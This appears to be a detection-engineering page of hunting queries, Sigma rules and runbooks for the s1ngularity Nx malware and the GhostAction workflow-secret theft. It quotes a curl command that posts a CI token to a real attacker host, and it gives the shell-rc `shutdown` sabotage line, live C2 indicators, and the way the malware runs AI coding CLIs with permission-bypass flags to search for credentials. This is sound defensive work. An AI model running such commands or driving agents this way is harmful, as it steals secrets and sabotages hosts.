https://snyk.io/blog/weaponizing-ai-coding-agents-for-malware-in-the-nx-malicious-package/
ATT&CKT1059.004 T1552.001 T1119
Data sourcesEndpoint.Processes
// s1ngularity: AI CLI launched with safety-bypass flags as part of credential recon
DeviceProcessEvents
| where Timestamp > ago(7d)
| where AccountName !endswith "$"
| where FileName in~ ("claude","gemini","q")
   or FolderPath endswith "/claude" or FolderPath endswith "/gemini" or FolderPath endswith "/q"
| where ProcessCommandLine has_any ("--dangerously-skip-permissions","--yolo","--trust-all-tools")
// the s1ngularity prompt writes to /tmp/inventory.txt — boosts confidence when present
| extend HasInventoryPrompt = ProcessCommandLine has "/tmp/inventory.txt" or ProcessCommandLine has "keystore" or ProcessCommandLine has "metamask"
| project Timestamp, DeviceName, AccountName, FileName, FolderPath,
          ProcessCommandLine,
          Parent = InitiatingProcessFileName,
          ParentCmd = InitiatingProcessCommandLine,
          GrandParent = InitiatingProcessParentFileName,
          HasInventoryPrompt, SHA256
| order by Timestamp desc
// s1ngularity: AI CLI launched with safety-bypass flags — ASIM cross-vendor
ImProcessCreate
| where TimeGenerated > ago(7d)
| where ActorUsername !endswith "$"
| where TargetProcessName in~ ("claude","gemini","q")
   or TargetProcessName endswith "/claude" or TargetProcessName endswith "/gemini" or TargetProcessName endswith "/q"
| where TargetProcessCommandLine has_any ("--dangerously-skip-permissions","--yolo","--trust-all-tools")
| extend HasInventoryPrompt = TargetProcessCommandLine has "/tmp/inventory.txt" or TargetProcessCommandLine has "keystore" or TargetProcessCommandLine has "metamask"
| project TimeGenerated, DvcHostname, ActorUsername,
          TargetProcessName, TargetProcessCommandLine,
          ParentProcessName, ParentProcessCommandLine, HasInventoryPrompt

s1ngularity nx: /tmp/inventory.txt staging file created on host AIActions on Objectives High
Detects creation of the s1ngularity malware's hard-coded staging artefact `/tmp/inventory.txt` (and its `.bak` companion), where the weaponised AI CLI tools dump discovered wallet/keystore/SSH/credential paths before exfiltration. The path is unique to this campaign and explicitly listed in vendor IOCs as a definitive 'you are compromised' marker. Rationale: Article and multiple second-source IRs (Kodem, Semgrep, Socket) explicitly call out /tmp/inventory.txt as the singular, unambiguous filesystem IOC: 'If this file exists, you have been affected'. Hard-coded, campaign-unique path means near-zero FP rate. Cross-checked against: • https://www.kodemsecurity.com/resources/vulnerability-alert-s1ngularity-malicious-nx-npm-packages • https://semgrep.dev/blog/2025/security-alert-nx-compromised-to-steal-wallets-and-credentials/ • https://socket.dev/blog/nx-packages-compromised • https://github.com/nrwl/nx/security/advisories/GHSA-cxm3-wv7p-598c

s1ngularity nx: node modifies ~/.bashrc or ~/.zshrc to inject `sudo shutdown -h 0` AIInstallation High
Detects the s1ngularity nx malware's persistence-as-sabotage payload: telemetry.js (running under node) appends `sudo shutdown -h 0` to the developer's `~/.bashrc` and `~/.zshrc`, causing every new shell to attempt an immediate host shutdown. The pairing of (a) a node process modifying a shell rc file and (b) the literal `shutdown -h 0` string in that file is unique to this campaign. Rationale: Article includes the exact JS snippet (`forceAppendAgentLine`) appending `sudo shutdown -h 0` to .bashrc/.zshrc — and CISA/CIS, Kaspersky, and the official Nx GHSA call this out as the persistence/DoS marker. Joining the rc-file modification to a subsequent shell-spawned `shutdown -h 0` is high-confidence campaign attribution. Cross-checked against: • https://www.cisecurity.org/advisory/a-vulnerability-in-nx-build-system-package-could-allow-for-sensitive-data-exfiltration_2025-090 • https://www.kaspersky.com/blog/nx-build-s1ngularity-supply-chain-attack/54223/ • https://github.com/nrwl/nx/security/advisories/GHSA-cxm3-wv7p-598c • https://bluefire-redteam.com/nx-s1ngularity-supply-chain-attack-what-you-need-to-know-and-how-to-protect-your-organization/
ATT&CKT1546.004 T1529 T1485
Data sourcesEndpoint.Filesystem Endpoint.Processes
// s1ngularity: node (post-install) modifies shell rc files — pair with shutdown content where available
let RcWritesByNode = DeviceFileEvents
    | where Timestamp > ago(30d)
    | where ActionType in ("FileModified","FileCreated")
    | where FileName in~ (".bashrc",".zshrc",".bash_profile",".profile")
    | where InitiatingProcessFileName in~ ("node","nodejs")
    | project Timestamp, DeviceName, FolderPath, FileName,
              NodeCmd = InitiatingProcessCommandLine,
              NodeParent = InitiatingProcessParentFileName,
              User = InitiatingProcessAccountName;
// optional enrichment — a follow-on shell that actually attempts shutdown
let ShutdownFromShellRc = DeviceProcessEvents
    | where Timestamp > ago(30d)
    | where InitiatingProcessFileName in~ ("bash","zsh","sh","dash")
    | where FileName =~ "shutdown" or FileName =~ "sudo"
    | where ProcessCommandLine has_all ("shutdown","-h","0")
    | project ShutdownTime = Timestamp, DeviceName, ProcessCommandLine, InitiatingProcessFileName;
RcWritesByNode
| join kind=leftouter ShutdownFromShellRc on DeviceName
| order by Timestamp desc
// s1ngularity: node (post-install) modifies shell rc files — ASIM
ImFileEvent
| where TimeGenerated > ago(30d)
| where EventType in ("FileModified","FileCreated")
| where TargetFileName in~ (".bashrc",".zshrc",".bash_profile",".profile")
| where ActingProcessName in~ ("node","nodejs") or ActingProcessName endswith "/node"
| project TimeGenerated, DvcHostname, EventType, TargetFilePath, TargetFileName,
          ActingProcessName, ActingProcessCommandLine, ActorUsername
| join kind=leftouter (
    ImProcessCreate
    | where TimeGenerated > ago(30d)
    | where ParentProcessName in~ ("bash","zsh","sh","dash")
    | where TargetProcessCommandLine has_all ("shutdown","-h","0")
    | project ShutdownTime = TimeGenerated, DvcHostname, ShutdownCmd = TargetProcessCommandLine
  ) on DvcHostname
| order by TimeGenerated desc

Asset exposure — vulnerability matches article CVE(s) Reconnaissance High
Match vulnerability scanner output to the CVE(s) named in the article.
ATT&CKT1190
Data sourcesVulnerabilities DeviceInfo DeviceTvmSoftwareVulnerabilities
// TVM tables are daily snapshots — pin a 1-day window so the engine
// partitions on Timestamp instead of scanning the full retention.
DeviceTvmSoftwareVulnerabilities
| where Timestamp > ago(1d)
| where CveId in~ ("CVE-2025-10894")
| join kind=inner (DeviceInfo | where Timestamp > ago(1d)) on DeviceId
| project DeviceName, OSPlatform, CveId, VulnerabilitySeverityLevel, RecommendedSecurityUpdate
| order by VulnerabilitySeverityLevel asc, DeviceName asc

// Sentinel has no native TVM table. If MDE→Sentinel streaming is enabled,
// `DeviceTvmSoftwareVulnerabilities` is available. Otherwise this UC has
// no Sentinel translation — track via Update / Heartbeat OS-version
// gaps as a coarse approximation.
DeviceTvmSoftwareVulnerabilities
| where TimeGenerated > ago(1d)
| where CveId in~ ("CVE-2025-10894")
| join kind=inner (DeviceInfo | where TimeGenerated > ago(1d)) on DeviceId
| project DeviceName, OSPlatform, CveId,
          VulnerabilitySeverityLevel, RecommendedSecurityUpdate
| order by VulnerabilitySeverityLevel asc, DeviceName asc
APPLICATION
Toggle if your env has no CIM data-model acceleration.
| tstats `summariesonly` count min(_time) as firstTime max(_time) as lastTime
    from datamodel=Vulnerabilities
    where Vulnerabilities.signature IN ("CVE-2025-10894")
    by Vulnerabilities.dest, Vulnerabilities.signature, Vulnerabilities.severity, Vulnerabilities.cve
| `drop_dm_object_name(Vulnerabilities)`
| sort - severity

    by Vulnerabilities.dest, Vulnerabilities.signature, Vulnerabilities.severity, Vulnerabilities.cve
| `drop_dm_object_name(Vulnerabilities)`

Trusted vendor binary / installer launching unusual children Exploitation Medium
Supply-chain trojan signal: legitimate signed binary spawning script interpreters or exotic LOLBins.
ATT&CKT1195.002
Data sourcesEndpoint.Processes DeviceProcessEvents
DeviceProcessEvents
| where Timestamp > ago(7d)
| where AccountName !endswith "$"
| where InitiatingProcessFileName in~ ("setup.exe","installer.exe","update.exe")
| where FileName in~ ("powershell.exe","cmd.exe","rundll32.exe","regsvr32.exe","mshta.exe","wscript.exe","cscript.exe","wmic.exe","bitsadmin.exe")
| project Timestamp, DeviceName, AccountName, InitiatingProcessFileName, FileName, ProcessCommandLine
// Replace `"setup.exe","installer.exe","update.exe"` with the vendor binaries observed in the
// article (matching shape with the Defender query).
SecurityEvent
| where TimeGenerated > ago(7d)
| where EventID == 4688
| where Account !endswith "$"
| where ParentProcessName has_any ("setup.exe","installer.exe","update.exe")
| where NewProcessName endswith "\powershell.exe"
   or NewProcessName endswith "\cmd.exe"
   or NewProcessName endswith "\rundll32.exe"
   or NewProcessName endswith "\regsvr32.exe"
   or NewProcessName endswith "\mshta.exe"
   or NewProcessName endswith "\wscript.exe"
   or NewProcessName endswith "\cscript.exe"
   or NewProcessName endswith "\wmic.exe"
   or NewProcessName endswith "\bitsadmin.exe"
| project TimeGenerated, Computer, Account, ParentProcessName,
          NewProcessName, CommandLine
| order by TimeGenerated desc

File hash IOCs — endpoint file/process match Installation High
Match SHA256/SHA1/MD5 named in the article against EDR file/process telemetry.
ATT&CKT1027
Data sourcesEndpoint.Filesystem Endpoint.Processes DeviceFileEvents DeviceProcessEvents
// Pre-filter each table BEFORE the union — the engine cannot push
// predicates across `union`, and DeviceFileEvents lacks ProcessCommandLine
// (Initiating only) so column-projection has to differ per side.
union
    ( DeviceFileEvents
        | where Timestamp > ago(7d)
        | where InitiatingProcessAccountName !endswith "$"
        | where SHA256 in~ ("3905475cfd0e0ea670e20c6a9eaeb768169dc33d") or SHA1 in~ ("3905475cfd0e0ea670e20c6a9eaeb768169dc33d") or MD5 in~ ("3905475cfd0e0ea670e20c6a9eaeb768169dc33d")
        | project Timestamp, DeviceName, ActionType, FileName, FolderPath, SHA256,
                  Cmd = InitiatingProcessCommandLine, Source = "DeviceFileEvents" ),
    ( DeviceProcessEvents
        | where Timestamp > ago(7d)
        | where AccountName !endswith "$"
        | where SHA256 in~ ("3905475cfd0e0ea670e20c6a9eaeb768169dc33d") or SHA1 in~ ("3905475cfd0e0ea670e20c6a9eaeb768169dc33d") or MD5 in~ ("3905475cfd0e0ea670e20c6a9eaeb768169dc33d")
        | project Timestamp, DeviceName, ActionType, FileName, FolderPath, SHA256,
                  Cmd = ProcessCommandLine, Source = "DeviceProcessEvents" )
| order by Timestamp desc

// Pre-filter both ASIM tables before the union — same pattern as the
// Defender version so the engine can push hash predicates per-side.
let BadHashes = dynamic(["3905475cfd0e0ea670e20c6a9eaeb768169dc33d"]);
union
    ( ImFileEvent
        | where TimeGenerated > ago(7d)
        | where ActorUsername !endswith "$"
        | where TargetFileSHA256 in~ (BadHashes)
           or TargetFileSHA1 in~ (BadHashes)
           or TargetFileMD5 in~ (BadHashes)
        | project TimeGenerated, DvcHostname, EventType,
                  TargetFileName, TargetFilePath, TargetFileSHA256,
                  Cmd = ActingProcessName, Source = "ImFileEvent" ),
    ( ImProcessCreate
        | where TimeGenerated > ago(7d)
        | where ActorUsername !endswith "$"
        | where SHA256 in~ (BadHashes) or SHA1 in~ (BadHashes) or MD5 in~ (BadHashes)
        | project TimeGenerated, DvcHostname, EventType = TargetProcessName,
                  TargetFileName = TargetProcessName, TargetFilePath = TargetProcessName,
                  TargetFileSHA256 = SHA256,
                  Cmd = TargetProcessCommandLine, Source = "ImProcessCreate" )
| order by TimeGenerated desc

ATT&CKT1190
Data sourcesVulnerabilities DeviceInfo DeviceTvmSoftwareVulnerabilities
// TVM tables are daily snapshots — pin a 1-day window so the engine
// partitions on Timestamp instead of scanning the full retention.
DeviceTvmSoftwareVulnerabilities
| where Timestamp > ago(1d)
| where CveId in~ ("CVE-2025-10585")
| join kind=inner (DeviceInfo | where Timestamp > ago(1d)) on DeviceId
| project DeviceName, OSPlatform, CveId, VulnerabilitySeverityLevel, RecommendedSecurityUpdate
| order by VulnerabilitySeverityLevel asc, DeviceName asc

// Sentinel has no native TVM table. If MDE→Sentinel streaming is enabled,
// `DeviceTvmSoftwareVulnerabilities` is available. Otherwise this UC has
// no Sentinel translation — track via Update / Heartbeat OS-version
// gaps as a coarse approximation.
DeviceTvmSoftwareVulnerabilities
| where TimeGenerated > ago(1d)
| where CveId in~ ("CVE-2025-10585")
| join kind=inner (DeviceInfo | where TimeGenerated > ago(1d)) on DeviceId
| project DeviceName, OSPlatform, CveId,
          VulnerabilitySeverityLevel, RecommendedSecurityUpdate
| order by VulnerabilitySeverityLevel asc, DeviceName asc

2025-09-19 7 use cases 1 technique 6 kill-chain phases detected

GitGuardian researchers discover massive supply chain attack affecting 817 repositories across 327 GitHub users. Malicious workflows exfiltrated 3,325 secrets including PyPI, npm, and DockerHub tokens through compromised developer accounts.

ATT&CKT1195.002

Reconnaissance. Attacker researches the target — OSINT, scanning, enumeration.
Weaponization. Coupling exploit code with deliverable payload (e.g. weaponized PDF/Office doc, trojanized installer). → [LLM] GhostAction GitHub workflow secret-enumeration commit pattern
Delivery. Transmitting the weapon (phishing email, USB, watering hole, drive-by, malicious ad).

GhostAction malicious workflow file added with curl POST to Plesk infrastructure AIInstallation High
Detects the GhostAction campaign's malicious workflow YAML landing on developer hosts (post git-pull) or self-hosted runners. Looks for newly written .github/workflows/*.yml whose contents reference the attacker-controlled bold-dhawan/objective-hopper Plesk endpoints or 45.139.104.115. Rationale: Anchors on the GhostAction file-system artefact: a *.yml under .github/workflows/ landing on dev or runner hosts. The static C2 strings are extremely article-specific and have effectively zero legitimate base rate; the parent-process narrowing to git/IDE tooling rules out CI tar-extractions. Cross-checked against: • https://blog.gitguardian.com/ghostaction-campaign • https://attack.mitre.org/techniques/T1546/
ATT&CKT1546 T1195.001
Data sourcesEndpoint.Filesystem_Changes
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Developer legitimately editing CI workflows that happen to reference Plesk-hosted documentation or sandbox endpoints
  • Repo-template scaffolding tools (cookiecutter, yeoman) writing workflow YAML from a vetted template
  • Mass git checkout of a monorepo with hundreds of existing legitimate workflows triggering bulk FileCreated events
Suppression filter
| where not(InitiatingProcessCommandLine has_any ("cookiecutter", "yeoman", "scaffold"))
Response runbook
Step 1 (triage): retrieve the YAML contents via FolderPath and check whether the file contains the bold-dhawan/objective-hopper/45.139.104.115/carte-avantage/493networking strings or a curl POST referencing ${{ secrets.* }}; cross-check git blame / GitHub audit log for the commit author and source IP. Step 2 (contain): force-revert the malicious workflow commit on the affected repo, disable the maintainer's GitHub PAT/SSH key, rotate every secret in the repo's Actions secrets store immediately (PyPI, npm, DockerHub, AWS, Cloudflare tokens). Step 3 (hunt): pivot on the maintainer account to enumerate other repos they pushed to in the last 30d; search GitHub org-wide for the C2 string; review AWS CloudTrail / npm / PyPI / DockerHub publish events for unusual releases after the commit.

| where FileName endswith ".yml" or FileName endswith ".yaml"
| where InitiatingProcessFileName in~ ("git.exe", "git", "code.exe", "devenv.exe", "explorer.exe", "gh.exe")
| project Timestamp, DeviceName, FolderPath, FileName, SHA256, InitiatingProcessFileName, InitiatingProcessCommandLine, InitiatingProcessAccountName
| order by Timestamp desc
ImFileEvent
| where TimeGenerated > ago(30d)

| where ActingProcessName has_any ("git", "code", "devenv", "gh")
| project TimeGenerated, DvcHostname, TargetFilePath, TargetFileName, TargetFileSHA256, ActingProcessName, ActingProcessCommandLine, ActorUsername
| order by TimeGenerated desc
title: GhostAction Malicious Workflow File Created
id: 7f8d3a12-1e4b-4f88-9c5e-b1f0aef96f01
description: Detects creation of a GitHub Actions workflow YAML file on disk via git/dev tooling, used as the planting vector for the GhostAction supply-chain campaign.
references:
  - https://www.stepsecurity.io/blog/ghostaction-campaign-over-3-000-secrets-stolen-through-malicious-github-workflows
  - https://blog.gitguardian.com/ghostaction-campaign
author: SOC Detection Engineering
date: 2025/09/05
tags:
  - attack.persistence
  - attack.t1546
  - attack.t1195.001
logsource:
  category: file_event
  product: windows
detection:
  selection:
    TargetFilename|contains:
      - '\.github\workflows\'
      - '/.github/workflows/'
    TargetFilename|endswith:
      - '.yml'
      - '.yaml'
  filter_proc:
    Image|endswith:
      - '\git.exe'
      - '\code.exe'
      - '\gh.exe'
  condition: selection and filter_proc
level: medium
source:(windows.sysmon OR linux.auditd) (@TargetFilename:(*\.github\workflows\*.yml OR */.github/workflows/*.yml OR *\.github\workflows\*.yaml OR */.github/workflows/*.yaml) OR @file.path:(*/.github/workflows/*.yml OR */.github/workflows/*.yaml)) @ParentImage:(*\git.exe OR *\Git.exe OR */git OR *\code.exe OR *\Code.exe OR *\gh.exe)
#event_simpleName=FileWritten
| regex("(\\\\|/)\\.github(\\\\|/)workflows(\\\\|/)", field=TargetFileName)
| TargetFileName=/\.(yml|yaml)$/i
| ContextImageFileName=/(git|code|devenv|gh)\.exe$/i
| groupBy([aid, ComputerName, TargetFileName, ContextImageFileName], function=count())

GhostAction C2 egress to Plesk-hosted exfiltration infrastructure AICommand & Control Medium
Network detection for any outbound traffic from corporate hosts or self-hosted runners to the GhostAction C2 endpoints: *.45-139-104-115.plesk.page, 45.139.104.115, carte-avantage.com and 493networking.cc. The domain should never appear in legitimate workflow or business traffic. Rationale: Static IOCs from the article body and IOC block (45.139.104.115, bold-dhawan/objective-hopper subdomains under 45-139-104-115.plesk.page, carte-avantage.com, 493networking.cc). Disposable Plesk-page infra cited only in the GhostAction campaign — corroborated against StepSecurity and GitGuardian advisories. Effectively zero legitimate base rate. Cross-checked against: • https://blog.gitguardian.com/ghostaction-campaign • https://www.stepsecurity.io/blog/ghostaction-campaign-over-3-000-secrets-stolen-through-malicious-github-workflows
ATT&CKT1071.001 T1583.001
Data sourcesNetwork_Traffic.All_Traffic Network_Resolution.DNS
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • IR/red-team tooling intentionally connecting to the IOC to validate blocking
  • Researcher VMs deliberately replaying the IOC during retrospective analysis
  • Sinkhole infrastructure that has subsequently taken over the IP and is being scanned by corporate vulnerability tooling
Suppression filter
| where InitiatingProcessFileName !in~ ("chrome.exe", "msedge.exe", "firefox.exe", "brave.exe")
Response runbook
Step 1 (triage): identify the initiating process and parent on the host (curl/wget under runner.worker = high confidence GhostAction; browser = likely researcher). Pull full process tree and HTTP body if proxy decryption available. Step 2 (contain): block 45.139.104.115 and *.45-139-104-115.plesk.page, carte-avantage.com, 493networking.cc at egress proxy and EDR network containment; isolate the host. Step 3 (hunt): backdate the search to 30d for any historical contact; pivot on InitiatingProcessAccountName for additional curl POSTs to other Plesk subdomains; review GitHub Actions run logs for the same period on any self-hosted runner that touched the IOC.

GhostAction curl/wget POST of CI/CD secret token to Plesk endpoint AIActions on Objectives High
Process-level detection for the exact GhostAction exfiltration command: curl/wget invoked with -X POST/-d carrying TOKEN=/API_KEY=/SECRET= patterns destined to the bold-dhawan or objective-hopper Plesk subdomains. Targets the actual payload string from the malicious workflow. Rationale: Anchored directly on the verbatim payload from the article: `curl -s -X POST -d 'CODECOV_TOKEN=${{ secrets.CODECOV_TOKEN }}' https://bold-dhawan.45-139-104-115.plesk.page`. Combining the curl/wget binary name with the article's exact destination string yields effectively zero false positives outside intentional IOC tests. Cross-checked against: • https://blog.gitguardian.com/ghostaction-campaign • https://www.stepsecurity.io/blog/ghostaction-campaign-over-3-000-secrets-stolen-through-malicious-github-workflows
ATT&CKT1567 T1552.001
Data sourcesEndpoint.Processes
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • IR/blue-team validation runs replaying the IOC against an isolated test host
  • Security training labs deliberately re-creating the attack chain
  • Threat-intel platforms (MISP/OpenCTI) curl-fetching the IOC as part of an enrichment workflow
Suppression filter
| where not(InitiatingProcessCommandLine has_any ("misp", "opencti", "sentineloneagent", "crowdstrike"))
Response runbook
Step 1 (triage): grab the full process tree (parent of curl, grandparent, and any sibling curl/wget invocations within ±60s) and the AccountName — if it's a runner user (e.g. `runner`, `Runner`, `ContainerAdministrator`) and the parent is Runner.Worker, treat as confirmed. Step 2 (contain): isolate the runner/host; revoke every secret accessible to that runner's repos (DockerHub, npm, PyPI, AWS, Cloudflare, GitHub PATs); remove the malicious workflow YAML from all branches and force-revert the planting commit. Step 3 (hunt): query GitHub audit logs for every workflow run in the last 30d that referenced ${{ secrets.* }} and resolved any *.plesk.page domain; pivot on the maintainer's identity for additional repos.
DeviceProcessEvents
| where Timestamp > ago(30d)
| where FileName in~ ("curl.exe", "curl", "wget.exe", "wget")
| where ProcessCommandLine has_any ("bold-dhawan.45-139-104-115.plesk.page", "objective-hopper.45-139-104-115.plesk.page", "45.139.104.115", "carte-avantage.com", "493networking.cc")
| where ProcessCommandLine matches regex @"(?i)(TOKEN|API_KEY|SECRET|PASSWORD|PAT|ACCESS_KEY)\s*="
    or ProcessCommandLine has_any ("-X POST", "--data", "--data-raw", " -d ")
| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine, InitiatingProcessFileName, InitiatingProcessCommandLine, InitiatingProcessFolderPath
| order by Timestamp desc
ImProcessCreate
| where TimeGenerated > ago(30d)
| where ActingProcessName has_any ("curl", "wget")
| where ActingProcessCommandLine has_any ("bold-dhawan.45-139-104-115.plesk.page", "objective-hopper.45-139-104-115.plesk.page", "45.139.104.115", "carte-avantage.com", "493networking.cc")
| where ActingProcessCommandLine matches regex @"(?i)(TOKEN|API_KEY|SECRET|PASSWORD|PAT|ACCESS_KEY)\s*="
    or ActingProcessCommandLine has_any ("-X POST", "--data", "--data-raw")
| project TimeGenerated, DvcHostname, ActorUsername, ActingProcessName, ActingProcessCommandLine, ParentProcessName, ParentProcessCommandLine
| order by TimeGenerated desc
title: GhostAction Curl POST of Secret Token to Plesk C2
id: 4e1f7b09-5c2d-44a8-8d1e-9bf0aef96f03
description: Detects the exact curl/wget POST exfiltration payload from GhostAction malicious workflow runs.
references:
  - https://www.stepsecurity.io/blog/ghostaction-campaign-over-3-000-secrets-stolen-through-malicious-github-workflows
author: SOC Detection Engineering
date: 2025/09/05
tags:
  - attack.exfiltration
  - attack.t1567
  - attack.t1552.001
logsource:
  category: process_creation
  product: linux
detection:
  selection_proc:
    Image|endswith:
      - '/curl'
      - '/wget'
      - '\curl.exe'
      - '\wget.exe'
  selection_dst:
    CommandLine|contains:
      - 'bold-dhawan.45-139-104-115.plesk.page'
      - 'objective-hopper.45-139-104-115.plesk.page'
      - '45.139.104.115'
      - 'carte-avantage.com'
      - '493networking.cc'
  condition: selection_proc and selection_dst
level: critical
source:(windows.sysmon OR windows.security OR linux.auditd) (@Image:(*\curl.exe OR *\Curl.exe OR */curl OR *\wget.exe OR *\Wget.exe OR */wget) OR @process.executable.path:(*/curl OR */wget)) (@CommandLine:(*bold-dhawan.45-139-104-115.plesk.page* OR *objective-hopper.45-139-104-115.plesk.page* OR *45.139.104.115* OR *carte-avantage.com* OR *493networking.cc*) OR @process.command_line:(*bold-dhawan.45-139-104-115.plesk.page* OR *45.139.104.115* OR *carte-avantage.com* OR *493networking.cc*))
#event_simpleName=ProcessRollup2
| ImageFileName=/(curl|wget)(\.exe)?$/i
| regex("(bold-dhawan\\.45-139-104-115\\.plesk\\.page|objective-hopper\\.45-139-104-115\\.plesk\\.page|45\\.139\\.104\\.115|carte-avantage\\.com|493networking\\.cc)", field=CommandLine)
| groupBy([aid, ComputerName, ImageFileName, CommandLine, ParentBaseFileName], function=count())

GitHub Actions self-hosted runner spawning curl/wget POST to non-allowlisted egress AIExploitation Medium
Generalisation of the GhostAction TTP for self-hosted runners — detects curl/wget POST invocations spawned by Runner.Worker/Runner.Listener where the destination is outside the corporate allowlist (github.com, githubusercontent.com, Azure CDN, package registries). Catches future variants that swap the C2 string. Rationale: Article notes that self-hosted runners with Harden-Runner could have caught the egress but GitHub-hosted runners were used precisely to evade it. This hunting query is the inverse for self-hosted estates: any runner spawning curl/wget POST to a non-package-registry host is suspicious whether or not the C2 string matches GhostAction. Generalises beyond the static IOCs. Cross-checked against: • https://www.stepsecurity.io/blog/ghostaction-campaign-over-3-000-secrets-stolen-through-malicious-github-workflows
ATT&CKT1059.004 T1609
Data sourcesEndpoint.Processes
Expected false positives · estimated rate: medium — model-assessed, tune to your environment
  • Custom action that uploads build artefacts to a corporate S3 bucket via curl (allowlist the bucket)
  • CI pipeline pushing Slack/Teams notifications via webhook (allowlist the webhook host)
  • Code-coverage step that uploads to codecov.io / coveralls.io
  • Datadog/Sentry telemetry POSTs from inside the build
  • Internal artifact repo (Artifactory, Nexus) reached over plain curl
Suppression filter
| where not(ProcessCommandLine has_any ("codecov.io", "coveralls.io", "slack.com/services", "hooks.slack.com", "sentry.io", "datadoghq.com", "artifactory", "nexus"))
Response runbook
Step 1 (triage): pull the workflow .yml that produced this run from the originating repo's HEAD and prior commits; check git log for who introduced the curl step and when; verify destination ownership via WHOIS / corporate asset inventory. Step 2 (contain): if destination is unknown, isolate the runner host, suspend the workflow, revoke runner registration token, rotate any secrets used by that workflow. Step 3 (hunt): query for the same destination across all runners in the last 90d; check other workflows referencing the same secret names; review GitHub audit logs for workflow file diffs introduced by the same actor.
DeviceProcessEvents
| where Timestamp > ago(7d)
| where FileName in~ ("curl.exe", "curl", "wget.exe", "wget")
| where InitiatingProcessFileName has_any ("Runner.Worker.exe", "Runner.Listener.exe", "Runner.Worker", "actions-runner", "runsvc")
| where ProcessCommandLine has_any ("-X POST", "--data", "--data-raw", "--data-binary")
| where not(ProcessCommandLine has_any ("github.com", "githubusercontent.com", "azureedge.net", "blob.core.windows.net", "pypi.org", "files.pythonhosted.org", "npmjs.org", "registry.npmjs.org", "docker.io", "registry-1.docker.io", "ghcr.io", "actions.githubusercontent.com", "pkg.actions.githubusercontent.com"))
| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine, InitiatingProcessFileName, InitiatingProcessCommandLine
| order by Timestamp desc
ImProcessCreate
| where TimeGenerated > ago(7d)
| where ActingProcessName has_any ("curl", "wget")
| where ParentProcessName has_any ("Runner.Worker", "Runner.Listener", "actions-runner", "runsvc")
| where ActingProcessCommandLine has_any ("-X POST", "--data", "--data-raw", "--data-binary")
| where not(ActingProcessCommandLine has_any ("github.com", "githubusercontent.com", "azureedge.net", "blob.core.windows.net", "pypi.org", "files.pythonhosted.org", "npmjs.org", "registry.npmjs.org", "docker.io", "registry-1.docker.io", "ghcr.io", "actions.githubusercontent.com"))
| project TimeGenerated, DvcHostname, ActorUsername, ActingProcessName, ActingProcessCommandLine, ParentProcessName, ParentProcessCommandLine
| order by TimeGenerated desc
source:(windows.sysmon OR linux.auditd) (@Image:(*\curl.exe OR *\Curl.exe OR */curl OR *\wget.exe OR *\Wget.exe OR */wget) OR @process.executable.path:(*/curl OR */wget)) @ParentImage:(*Runner.Worker* OR *Runner.Listener* OR *actions-runner*) (@CommandLine:(*"-X POST"* OR *"--data"*) OR @process.command_line:(*"-X POST"* OR *"--data"*)) -@CommandLine:(*github.com* OR *githubusercontent.com* OR *azureedge.net* OR *blob.core.windows.net* OR *pypi.org* OR *npmjs.org* OR *docker.io* OR *ghcr.io*)
#event_simpleName=ProcessRollup2
| ImageFileName=/(curl|wget)(\.exe)?$/i
| ParentBaseFileName=/(Runner\.Worker|Runner\.Listener|actions-runner|runsvc)/i
| regex("(-X POST|--data|--data-raw|--data-binary)", field=CommandLine)
| NOT (regex("(github\\.com|githubusercontent\\.com|azureedge\\.net|blob\\.core\\.windows\\.net|pypi\\.org|npmjs\\.org|docker\\.io|ghcr\\.io)", field=CommandLine))
| groupBy([aid, ComputerName, ImageFileName, ParentBaseFileName, CommandLine], function=count())

GhostAction GitHub workflow secret-enumeration commit pattern AIWeaponization Medium
Hunting query for the GhostAction commit signature on developer endpoints — newly committed/edited workflow YAML referencing many distinct ${{ secrets.<NAME> }} variables alongside an outbound curl/wget call in a single shell step. Catches the tailored-secret-bundle TTP independent of the C2 string. Rationale: GitGuardian's writeup emphasises that the attackers enumerated secret names per-repo before crafting bespoke workflows — so the commit signature (workflow file containing both `secrets.X` references and a network call within a single run step) is the article-specific behavioural signal independent of the current C2. Surfaces future GhostAction-style campaigns even after the Plesk IOCs go cold. Cross-checked against: • https://blog.gitguardian.com/ghostaction-campaign • https://www.stepsecurity.io/blog/ghostaction-campaign-over-3-000-secrets-stolen-through-malicious-github-workflows
ATT&CKT1552.001 T1119 T1036.005
Data sourcesEndpoint.Filesystem_Changes
Expected false positives · estimated rate: medium — model-assessed, tune to your environment
  • Legitimate maintainer adding a new CI step that consumes several pre-existing secrets (e.g. a deploy job using AWS_KEY + AWS_SECRET + AWS_REGION)
  • Refactoring a monolithic workflow into a single send-all-telemetry curl step (Datadog CI Visibility, custom build dashboards)
  • Migrating from one secret-manager naming scheme to another (mass rename PR)
Response runbook
Step 1 (triage): open the YAML diff and inspect the destination of the curl/wget command; verify the maintainer's recent commits, source IPs, and 2FA-history for anomaly; check whether the secrets referenced match the legitimate workflow's actual needs. Step 2 (contain): if the destination is unfamiliar, revert the PR/commit, disable the maintainer's PAT, and rotate every secret enumerated in the malicious step. Step 3 (hunt): pivot on the maintainer account across the org's repos; search for any workflow committed in the last 30d that POSTs `secrets.*` to non-allowlisted hosts; review GitHub audit logs for `workflows.updated_workflow_run` events from anomalous client IPs.
DeviceFileEvents
| where Timestamp > ago(30d)
| where ActionType in ("FileCreated", "FileModified")
| where FolderPath has @"\.github\workflows\" or FolderPath has "/.github/workflows/"
| where FileName endswith ".yml" or FileName endswith ".yaml"
| join kind=inner (
    DeviceProcessEvents
    | where Timestamp > ago(30d)
    | where FileName in~ ("git.exe", "git", "gh.exe")
    | where ProcessCommandLine has_any ("commit", "push")
    | project DeviceId, GitTime = Timestamp, InitiatingProcessAccountName, ProcessCommandLine
) on DeviceId
| where abs(datetime_diff('second', Timestamp, GitTime)) < 120
| project Timestamp, DeviceName, FolderPath, FileName, InitiatingProcessFileName, InitiatingProcessAccountName, ProcessCommandLine
| order by Timestamp desc
ImFileEvent
| where TimeGenerated > ago(30d)
| where EventType in ("FileCreated", "FileModified")
| where TargetFilePath has @"\.github\workflows\" or TargetFilePath has "/.github/workflows/"
| where TargetFileExtension in~ ("yml", "yaml")
| join kind=inner (
    ImProcessCreate
    | where TimeGenerated > ago(30d)
    | where ActingProcessName has "git"
    | where ActingProcessCommandLine has_any ("commit", "push")
